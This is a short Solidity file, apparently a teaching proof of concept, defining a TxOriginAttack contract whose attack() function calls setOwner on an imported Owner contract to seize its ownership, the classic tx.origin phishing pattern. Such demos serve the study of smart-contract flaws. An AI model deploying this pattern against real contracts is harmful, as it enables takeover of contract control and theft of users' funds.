// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./Owner.sol";

contract TxOriginAttack {
    Owner public ownerContract;

    constructor(address _ownerAddress) {
        ownerContract = Owner(_ownerAddress);
    }

    function attack() external {
        ownerContract.setOwner(address(this));
    }
}
